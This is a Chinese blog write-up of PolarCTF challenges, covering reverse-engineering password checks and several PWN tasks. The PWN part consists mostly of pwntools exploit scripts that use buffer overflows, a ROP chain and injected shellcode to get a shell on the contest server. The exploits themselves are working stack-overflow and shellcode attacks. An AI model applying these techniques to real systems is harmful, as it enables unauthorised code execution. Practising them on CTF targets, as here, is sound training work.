<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main_0(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  size_t i; // [esp+D0h] [ebp-84h]</span><br><span class="line">  char Str2[60]; // [esp+DCh] [ebp-78h] BYREF</span><br><span class="line">  char Str1[39]; // [esp+118h] [ebp-3Ch] BYREF</span><br><span class="line">  int v7; // [esp+13Fh] [ebp-15h]</span><br><span class="line">  int v8; // [esp+143h] [ebp-11h]</span><br><span class="line">  __int16 v9; // [esp+147h] [ebp-Dh]</span><br><span class="line">  char v10; // [esp+149h] [ebp-Bh]</span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_53B006);</span><br><span class="line">  strcpy(Str1, &quot;oehnr8&gt;?;&lt;?:9k&gt;09;hj00o&gt;:&lt;o?8lh;8h9l;t&quot;);</span><br><span class="line">  v7 = 0;</span><br><span class="line">  v8 = 0;</span><br><span class="line">  v9 = 0;</span><br><span class="line">  v10 = 0;</span><br><span class="line">  j__memset(Str2, 0, 0x32u);</span><br><span class="line">  sub_45748D(&quot;请输入密码\r\n&quot;);</span><br><span class="line">  sub_457929(&amp;unk_510E50, (char)Str2);</span><br><span class="line">  for ( i = 0; i &lt; j__strlen(Str2); ++i )</span><br><span class="line">    Str2[i] ^= 9u;</span><br><span class="line">  if ( !j__strcmp(Str1, Str2) )</span><br><span class="line">    sub_45748D(&quot;right&quot;);</span><br><span class="line">  else</span><br><span class="line">    sub_45748D(&quot;error&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># py脚本</span></span><br><span class="line">encrypted_str = <span class="string">&quot;oehnr8&gt;?;&lt;?:9k&gt;09;hj00o&gt;:&lt;o?8lh;8h9l;t&quot;</span></span><br><span class="line">flag = <span class="built_in">bytearray</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> encrypted_str:</span><br><span class="line">    <span class="comment"># 解密：异或 9u</span></span><br><span class="line">    decrypted_char = <span class="built_in">ord</span>(char) ^ <span class="number">9</span></span><br><span class="line">    flag.append(decrypted_char)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为可读字符串</span></span><br><span class="line">flag_str = flag.decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted Password:&quot;</span>, flag_str)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到flag--Decrypted Password: flag&#123;17625630b7902ac99f735f61ea21a0e2&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="加加减减"><a href="#加加减减" class="headerlink" title="加加减减"></a>加加减减</h3><p>首先更改文件后缀解压压缩包得到exe，然后放到ida分析，得到加密的代码进行分析，把用户输入的字符的ASCII-1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main_0(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char v4; // [esp+0h] [ebp-154h]</span><br><span class="line">  char v5; // [esp+0h] [ebp-154h]</span><br><span class="line">  size_t i; // [esp+D0h] [ebp-84h]</span><br><span class="line">  char Str[60]; // [esp+DCh] [ebp-78h] BYREF</span><br><span class="line">  char Str2[39]; // [esp+118h] [ebp-3Ch] BYREF</span><br><span class="line">  int v9; // [esp+13Fh] [ebp-15h]</span><br><span class="line">  int v10; // [esp+143h] [ebp-11h]</span><br><span class="line">  __int16 v11; // [esp+147h] [ebp-Dh]</span><br><span class="line">  char v12; // [esp+149h] [ebp-Bh]</span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_41C009);</span><br><span class="line">  strcpy(Str2, &quot;ek`fz5123086/ce7ac7/`4a81`6/87b`b28a5|&quot;);</span><br><span class="line">  v9 = 0;</span><br><span class="line">  v10 = 0;</span><br><span class="line">  v11 = 0;</span><br><span class="line">  v12 = 0;</span><br><span class="line">  j_memset(Str, 0, 0x32u);</span><br><span class="line">  sub_41104B(&quot;input\r\n&quot;, v4);</span><br><span class="line">  sub_4110AA(&quot;%s&quot;, (char)Str);</span><br><span class="line">  for ( i = 0; i &lt; j_strlen(Str); ++i )</span><br><span class="line">    --Str[i];</span><br><span class="line">  if ( !j_strcmp(Str, Str2) )</span><br><span class="line">    sub_41104B(&quot;success\r\n&quot;, v5);</span><br><span class="line">  else</span><br><span class="line">    sub_41104B(&quot;sorry\r\n&quot;, v5);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#py脚本</span></span><br><span class="line">encrypted_str = <span class="string">&quot;ek`fz5123086/ce7ac7/`4a81`6/87b`b28a5|&quot;</span></span><br><span class="line">flag = <span class="built_in">bytearray</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> encrypted_str:</span><br><span class="line">    <span class="comment"># 每个字符的 ASCII 码值 +1</span></span><br><span class="line">    decrypted_char = <span class="built_in">ord</span>(char) + <span class="number">1</span></span><br><span class="line">    flag.append(decrypted_char)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为可读字符串</span></span><br><span class="line">flag_str = flag.decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted Password:&quot;</span>, flag_str)</span><br><span class="line"><span class="comment">#得到flag--Decrypted Password: flag&#123;62341970df8bd80a5b92a7098cac39b6&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>pwn题目的基本步骤先用file 和checksec看一下文件，然后放到ida中分析，然后调试，写py脚本</p>
<h3 id="sandbox"><a href="#sandbox" class="headerlink" title="sandbox"></a>sandbox</h3><p>首先分析一下源码，在main()函数中发现了box()函数，进去看一下，发现了有if语句对输入的buf进行了判断，然后发现字符串中没有/bin/sh,那应该是用<code>$0</code>了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 18.59.56.png" alt="截屏2025-03-05 18.59.56" style="zoom:50%;" /></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 19.01.15.png" alt="截屏2025-03-05 19.01.15" style="zoom:50%;" /></p>
<p>那么编写py脚本,得到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./sandbox&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2147</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;$0&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="creeper"><a href="#creeper" class="headerlink" title="creeper"></a>creeper</h3><p>分析到该文件是64位的，在main函数中有一个game函数，发现read函数读取buf，然后if去比较buf的长度是否等于15，如果等于15就会输出flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 20.14.03.png" alt="截屏2025-03-05 20.14.03" style="zoom:50%;" /></p>
<p>直接编写py脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./creeper&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2088</span>)</span><br><span class="line">padding = <span class="number">0x40</span> +<span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">14</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="简单溢出"><a href="#简单溢出" class="headerlink" title="简单溢出"></a>简单溢出</h3><p>分析main函数发现只有一个输入，根据题目，肯定是溢出发现有<code>/bin/sh</code>字符串，然后通过查看该字符串发现了后门函数fact</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 20.53.51.png" alt="截屏2025-03-05 20.53.51" style="zoom:50%;" /></p>
<p>直接构造payload,得到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./hahaha&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2122</span>)</span><br><span class="line">padding = <span class="number">0x30</span> + <span class="number">8</span> </span><br><span class="line">fact_addr = <span class="number">0x400596</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p64(fact_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="Emm"><a href="#Emm" class="headerlink" title="Emm"></a>Emm</h3><p>该文件为32位，并且通过ida发现存在flag函数内容是<code>cat flag</code>,那么直接构造</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 21.46.53.png" alt="截屏2025-03-05 21.46.53" style="zoom:50%;" /></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./emm&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2078</span>)</span><br><span class="line">padding = <span class="number">0x58</span> + <span class="number">4</span></span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x080484CB</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding +  p32(flag_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()     </span><br></pre></td></tr></table></figure>
<h3 id="Choice"><a href="#Choice" class="headerlink" title="Choice"></a>Choice</h3><p>通过分析，发现了经典后门函数Shell，可以直接构造调用了,然后找一下如何进行栈溢出来调用这个shell函数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 21.50.52.png" alt="截屏2025-03-05 21.50.52"></p>
<p>通过发现Data1()和Data2()两个函数满足栈溢出条件，但是不满足攻击条件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 22.22.40.png" alt="截屏2025-03-05 22.22.40" style="zoom:50%;" /><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 22.22.59.png" alt="截屏2025-03-05 22.22.40" style="zoom:50%;" /></p>
<p>发现Data3()满足栈溢出的攻击攻击条件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 22.24.38.png" alt="截屏2025-03-05 22.24.38" style="zoom:50%;" /></p>
<p>通过代码，发现要先运行main函数输入3才能进入Data3函数，所以写脚本的时候要先发送一个3</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 22.25.54.png" alt="截屏2025-03-05 22.25.54" style="zoom:50%;" /></p>
<p>构造payload，得到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./Choice&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2077</span>)</span><br><span class="line">padding = <span class="number">0x30</span> + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">shell_addr = <span class="number">0x4007BD</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Menu:\n&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>) <span class="comment">#先发送3来进入Data3函数</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p64(shell_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="overload1"><a href="#overload1" class="headerlink" title="overload1"></a>overload1</h3><p>在main函数中看到了后门函数，那么看看如何能运行到这个函数，分析一下，首先输入v5的值，然后与y进行比较，等于y进入后输入v4的值，最后会用v5的1去与a比较，那么根据题目overload，应该是v4把v5给覆盖了，通过地址看出来的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 23.15.15.png" alt="截屏2025-03-05 23.15.15" style="zoom:50%;" /></p>
<p>构造payload,来获得flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./overload1&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2091</span>)</span><br><span class="line">padding = <span class="number">0x110</span> + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;y/n\n&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h3><p>通过源码分析，有/bin/sh还有shell函数，那么拼接一下就可以了，主函数中有function函数有一个读取，根据文件为64位，那么payload应该是rdi占满后加上system(“/bin/sh”)</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 23.33.47.png" alt="截屏2025-03-05 23.33.47" style="zoom:50%;" /><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 23.34.05.png" alt="截屏2025-03-05 23.34.05" style="zoom:50%;" /></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 23.34.25.png" alt="截屏2025-03-05 23.34.25" style="zoom:50%;" /></p>
<p>构造一下payload,得到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./x64&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2083</span>)</span><br><span class="line">padding = <span class="number">0x80</span> + <span class="number">8</span></span><br><span class="line">binsh_addr = <span class="number">0x601060</span></span><br><span class="line"></span><br><span class="line">shell_addr = <span class="number">0x4006B6</span></span><br><span class="line">rdi_addr = <span class="number">0x4007e3</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p64(rdi_addr) + p64(binsh_addr) + p64(shell_addr)</span><br><span class="line"><span class="comment">#64位的参数从左到右放入寄存器：RDI, RSI, RDX, ECX, R8, R9，之后跟32位一样，找出溢出偏移量、进入function函数中、覆盖返回地址为shell 将/bin/sh作为参数传入</span></span><br><span class="line"><span class="comment"># 还差一个rdi地址</span></span><br><span class="line"><span class="comment"># 使用命令：</span></span><br><span class="line"><span class="comment"># ROPgadget --binary x64 --only &quot;pop|ret&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 23.38.44.png" alt="截屏2025-03-05 23.38.44" style="zoom:50%;" /></p>
<h3 id="你是大佬还是菜鸡"><a href="#你是大佬还是菜鸡" class="headerlink" title="你是大佬还是菜鸡"></a>你是大佬还是菜鸡</h3><p>通过分析源码，得到当输入2的时候会进入Caiji函数，进而读取buf，来进行溢出漏洞，通过搜索发现hint函数是经典的后门函数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-06 10.22.11.png" alt="截屏2025-03-06 10.22.11" style="zoom:50%;" /><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-06 10.22.39.png" alt="截屏2025-03-06 10.22.39" style="zoom:50%;" /><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-06 10.23.09.png" alt="截屏2025-03-06 10.23.09" style="zoom:50%;" /></p>
<p>需要通过payload调用hint函数的地址，让caiji函数读取进而得到shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2070</span>)</span><br><span class="line">padding = <span class="number">0x20</span> + <span class="number">8</span></span><br><span class="line">hint_addr = <span class="number">0x4008b0</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Ji\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>) <span class="comment">#先发送2来进入caiji函数，来进行溢出漏洞</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p64(hint_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="Easy-ShellCode"><a href="#Easy-ShellCode" class="headerlink" title="Easy_ShellCode"></a>Easy_ShellCode</h3><p>通过分析源码，发现main函数中有一个Start函数，但是通过字符串搜索没有发现<code>/bin/sh</code>那么就需要自己写shellcode了，后来发现这个start函数有两次输入，第一次读取的是str变量，发现他在bss段，那么就可以把shellcode放到这里，然后第二次读取buf的时候进行溢出，去调取bss的地址也就是bss_addr</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-06 14.27.56.png" alt="截屏2025-03-06 14.27.56" style="zoom:50%;" /></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-06 14.28.13.png" alt="截屏2025-03-06 14.28.13" style="zoom:50%;" /></p>
<p>有思路了，那就构造payload，获得flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./Easy_ShellCode&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>,<span class="number">2102</span>)</span><br><span class="line">padding = <span class="number">0x68</span> + <span class="number">4</span></span><br><span class="line">bss_addr = <span class="number">0x804A080</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Input:\n&#x27;</span>)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;?:\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p32(bss_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="play"><a href="#play" class="headerlink" title="play"></a>play</h3><p>分析源码，发现main函数中有一个play函数，然后有两次输入，一次是读取，第二次是gets，那么可以第一次read可以去读shellcode第二次gets去找bss_addr</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-06 15.08.55.png" alt="截屏2025-03-06 15.08.55" style="zoom:50%;" /></p>
<p>构造payload,得到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./play&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;1.95.36.136&#x27;</span>, <span class="number">2062</span>)</span><br><span class="line">padding = <span class="number">0x30</span> + <span class="number">8</span></span><br><span class="line">bss_addr = <span class="number">0x6010A0</span></span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;playing.\n&#x27;</span>,shellcode)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding  + p64(bss_addr)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;game?\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">guipi</div><div class="post-copyright__author_desc">每天都一样，你要积极又向上</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://guipi01.github.io/posts/bcd86d8.html">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://guipi01.github.io/posts/bcd86d8.html')">polarctf_wp</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://guipi01.github.io/posts/bcd86d8.html"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=polarctf_wp&amp;url=https://guipi01.github.io/posts/bcd86d8.html&amp;pic=https://gcore.jsdelivr.net/gh/guipi01/images@main/wallhaven-exdl2k.jpg" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://guipi01.github.io" target="_blank">guipi`Blog</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/CTF/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>CTF<span class="tagsPageCount">2</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://gcore.jsdelivr.net/gh/guipi01/images@main/wallhaven-l8evjr.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/4a17b156.html"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Hello World</div></div></a></div><div class="next-post pull-right"><a href="/posts/ccc6fa83.html"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/wallhaven-d6927j.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">BUUCTF_WP</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/posts/ccc6fa83.html" title="BUUCTF_WP"><img class="cover" src= 